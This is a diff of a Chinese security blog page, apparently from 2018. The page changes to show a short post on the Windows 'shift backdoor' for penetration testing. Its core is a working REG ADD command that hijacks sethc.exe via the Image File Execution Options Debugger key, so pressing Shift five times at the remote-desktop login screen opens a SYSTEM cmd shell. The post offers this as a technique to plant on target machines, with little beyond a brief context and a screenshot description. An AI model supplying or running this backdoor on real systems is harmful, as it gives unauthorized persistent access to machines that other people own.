@@ -4,16 +4,20 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>AK-47&#39;s blog</title>
+    <title>shift后门妙用 | AK-47&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="AK-47">
+    
+    <meta name="description" itemprop="description" content="部署博客到github">
     
     
     
     <meta name="twitter:card" content="summary" />
     <meta name="twitter:site" content="ak-47" />
-    <meta name="twitter:title" content="AK-47&#39;s blog" />
+    <meta name="twitter:title" content="shift后门妙用 | AK-47&#39;s blog" />
+      
+        <meta name="twitter:description" content="部署博客到github" />
       
     
     
@@ -66,75 +70,118 @@
 </div>
 
     </header>
-    
-
     <div id="container">
-      <div id="main">
-
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2018/03/21/shift后门妙用/" title="shift后门妙用" itemprop="url">
-  
-    <h1 itemprop="name">shift后门妙用</h1>
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
     
-     
-      <p itemprop="description" >部署博客到github</p>
-      
+      <a href="/2018/03/21/shift后门妙用/" title="shift后门妙用" itemprop="url">shift后门妙用</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
     
+      <a href="http://ak47-sec.com" title="AK-47">AK-47</a>
+    </p>
+  -->  
+  <p class="article-time">
     <time datetime="2018-03-21T02:06:01.000Z" itemprop="datePublished">2018-03-21</time>
-  </a>
-</section>
+    Updated:<time datetime="2018-03-21T02:47:40.049Z" itemprop="dateModified">2018-03-21</time>
+    
+  </p>
+</header>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2018/03/19/Hexo常用命令/" title="Hexo常用命令" itemprop="url">
-  
-    <h1 itemprop="name">Hexo常用命令</h1>
-    
-     
-      <p itemprop="description" >Hexo常用命令</p>
-      
-    
-    <time datetime="2018-03-19T08:54:02.000Z" itemprop="datePublished">2018-03-19</time>
-  </a>
-</section>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#背景"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#表现形式"><span class="toc-number">1.1.</span> <span class="toc-text">表现形式:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解决方法"><span class="toc-number">2.</span> <span class="toc-text">解决方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#效果"><span class="toc-number">3.</span> <span class="toc-text">效果</span></a></li></ol>
+		</div>
+		
+		<p><body onload="prettyPrint()"></body></p>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。对于非服务器版本的Windows系统默认只允许一个账户登录。</p>
+<h2 id="表现形式"><a href="#表现形式" class="headerlink" title="表现形式:"></a>表现形式:</h2><blockquote>
+<p>远程登录时使用与原系统相同的账户，原系统将被切换到登录界面(当前用户会被挤掉线)</p>
+</blockquote>
+<p><img src="3-1.jpg" alt="3-1"></p>
+<blockquote>
+<p>使用不同的账户，登录时提示其他用户已登录到此计算机，如下图:</p>
+</blockquote>
+<p><img src="3-2.jpg" alt="3-2"></p>
+<h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>向目标机器植入shift后门，连接成功后5下shift便可弹出cmd shell。命令如下(无需换行)：</p>
+<pre class="prettyprint linenums">
+REG ADD 
+"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" 
+/t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+</pre>
 
-  <section class="post" itemscope itemprop="blogPost">
+<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>连接后5下shift，截图如下:</p>
+<p><img src="3-3.jpg" alt="3-3"></p>
   
-    <a href="/2018/03/15/Hexo搭建博客No-II/" title="Hexo搭建博客No-II" itemprop="url">
-  
-    <h1 itemprop="name">Hexo搭建博客No-II</h1>
-    
-     
-      <p itemprop="description" >部署博客到github</p>
-      
-    
-    <time datetime="2018-03-15T08:36:09.000Z" itemprop="datePublished">2018-03-15</time>
-  </a>
-</section>
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-  <section class="post" itemscope itemprop="blogPost">
   
-    <a href="/2018/03/14/Hexo搭建博客No-I/" title="Hexo搭建博客No.I" itemprop="url">
-  
-    <h1 itemprop="name">Hexo搭建博客No.I</h1>
-    
-     
-           <p itemprop="description" >思维导图总览：
-什么是Hexo：hexo是Hexo是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。
-安装Hexo的前置条件：
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
 
-Node.js 安装教程Git 安装教程
-
-Windows用户安</p>
-        
-    
-    <time datetime="2018-03-14T09:57:29.000Z" itemprop="datePublished">2018-03-14</time>
-  </a>
-</section>
 
 
 </div>
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/AD系列/">AD系列</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/内网渗透/">内网渗透</a><a href="/tags/AD/">AD</a>
+  </div>
+
+
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/03/19/Hexo常用命令/"  title="Hexo常用命令">
+ <strong>Next:</strong><br/> 
+ <span>Hexo常用命令
+</span>
+</a>
+</div>
+
+</nav>
+
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-shift后门妙用" data-title="shift后门妙用" data-url="http://ak47-sec.com/2018/03/21/shift后门妙用/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
       <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
 
 <div id="asidepart">
@@ -271,7 +318,51 @@ $(document).ready(function(){
 });
 </script>
 
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
 
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"ak47githubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
 
 
 
@@ -319,5 +410,5 @@ document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3
 
 
   </body>
- </html>
+</html>
 
